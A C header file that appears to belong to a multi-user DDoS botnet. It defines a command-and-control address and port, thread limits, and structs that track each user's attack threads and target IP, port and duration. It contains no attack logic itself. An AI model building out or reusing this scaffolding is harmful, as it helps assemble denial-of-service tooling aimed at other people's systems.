#ifndef CONFIG_H
#define CONFIG_H

#include <pthread.h>
#include <time.h>

#define C2_ADDRESS "192.168.0.106"
#define C2_PORT 1337
#define MAX_USERS 50
#define MAX_ATTACKS_PER_USER 10
#define BUFFER_SIZE 2048
#define MAX_THREADS 1000

typedef struct {
    pthread_t thread_id;
    int active;
    int stop;
    int thread_count;
} attack_thread_t;

typedef struct {
    char username[32];
    attack_thread_t attacks[MAX_ATTACKS_PER_USER];
    int attack_count;
} user_attack_t;

typedef struct {
    char ip[128];
    int port;
    time_t end_time;
    int *stop_flag;
} attack_params_t;

extern user_attack_t user_attacks[MAX_USERS];
extern int user_count;
extern pthread_mutex_t user_mutex;

#endif